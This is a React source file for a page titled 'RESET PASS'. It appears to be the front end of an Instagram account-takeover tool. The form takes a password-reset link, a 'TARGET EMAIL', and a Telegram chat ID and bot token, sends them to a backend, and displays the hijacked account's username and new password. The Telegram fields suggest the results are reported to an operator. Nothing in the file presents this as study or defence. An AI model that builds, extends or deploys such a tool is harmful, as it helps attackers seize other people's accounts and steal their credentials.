import { useState } from "react";
import { Link } from "wouter";
import { useToast } from "@/hooks/use-toast";

export default function ResetPass() {
  const { toast } = useToast();
  const [form, setForm] = useState({
    resetLink: "",
    email: "",
    chatId: "",
    botToken: "",
    customPassword: "",
  });
  const [result, setResult] = useState<{ success: boolean; username?: string | null; password?: string | null; error?: string | null } | null>(null);
  const [loading, setLoading] = useState(false);

  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    setForm((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();

    if (!form.resetLink || !form.email || !form.chatId || !form.botToken) {
      toast({ title: "Error", description: "Fill all required fields", variant: "destructive" });
      return;
    }

    setLoading(true);
    setResult(null);

    try {
      const res = await fetch("/api/reset-pass", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          resetLink: form.resetLink,
          email: form.email,
          chatId: form.chatId,
          botToken: form.botToken,
          customPassword: form.customPassword || null,
        }),
      });
      const data = await res.json();
      setResult(data);
      if (data.success) {
        toast({ title: "Success", description: `Password reset for @${data.username}` });
      } else {
        toast({ title: "Failed", description: data.error ?? "Unknown error", variant: "destructive" });
      }
    } catch (err) {
      toast({ title: "Error", description: String(err), variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  const fields = [
    { name: "resetLink", label: "RESET LINK (from email)", placeholder: "https://www.instagram.com/accounts/password/reset/?uidb36=...&token=...", required: true },
    { name: "email", label: "TARGET EMAIL", placeholder: "target@gmail.com", required: true },
    { name: "chatId", label: "TELEGRAM CHAT ID", placeholder: "-1001234567890", required: true },
    { name: "botToken", label: "TELEGRAM BOT TOKEN", placeholder: "1234567890:AAF...", required: true },
    { name: "customPassword", label: "CUSTOM PASSWORD (optional)", placeholder: "Leave empty for random", required: false },
  ] as const;

  return (
    <div className="min-h-screen p-8 max-w-2xl mx-auto space-y-6">
      <div className="flex items-center gap-4">
        <Link href="/" data-testid="link-back" className="text-muted-foreground hover:text-primary text-sm">&lt; BACK</Link>
        <h1 className="text-primary font-mono text-lg">RESET PASS</h1>
      </div>

      <div className="border border-border p-6 space-y-4">
        <p className="text-muted-foreground text-xs">&gt; Reset Instagram password via recovery link</p>

        <form onSubmit={handleSubmit} className="space-y-4">
          {fields.map((field) => (
            <div key={field.name} className="space-y-1">
              <label className="text-primary text-xs font-mono">{field.label}</label>
              <input
                data-testid={`input-${field.name}`}
                type="text"
                name={field.name}
                value={form[field.name]}
                onChange={handleChange}
                placeholder={field.placeholder}
                className="w-full bg-background border border-input text-foreground font-mono text-sm p-3 focus:outline-none focus:border-primary placeholder:text-muted-foreground"
              />
            </div>
          ))}

          <button
            data-testid="button-submit"
            type="submit"
            disabled={loading}
            className="w-full border border-primary text-primary hover:bg-primary hover:text-primary-foreground transition-colors p-3 font-mono text-sm disabled:opacity-50"
          >
            {loading ? "PROCESSING..." : "RESET PASSWORD"}
          </button>
        </form>
      </div>

      {result && (
        <div className={`border p-6 space-y-2 ${result.success ? "border-primary" : "border-destructive"}`} data-testid="result-panel">
          <p className="text-muted-foreground text-xs mb-3">&gt; RESULT:</p>
          {result.success ? (
            <>
              <p className="text-primary font-mono text-sm">[SUCCESS]</p>
              <p className="text-primary font-mono text-sm">USERNAME: {result.username}</p>
              <p className="text-primary font-mono text-sm">PASSWORD: {result.password}</p>
            </>
          ) : (
            <p className="text-destructive font-mono text-sm">[FAILED] {result.error}</p>
          )}
        </div>
      )}
    </div>
  );
}
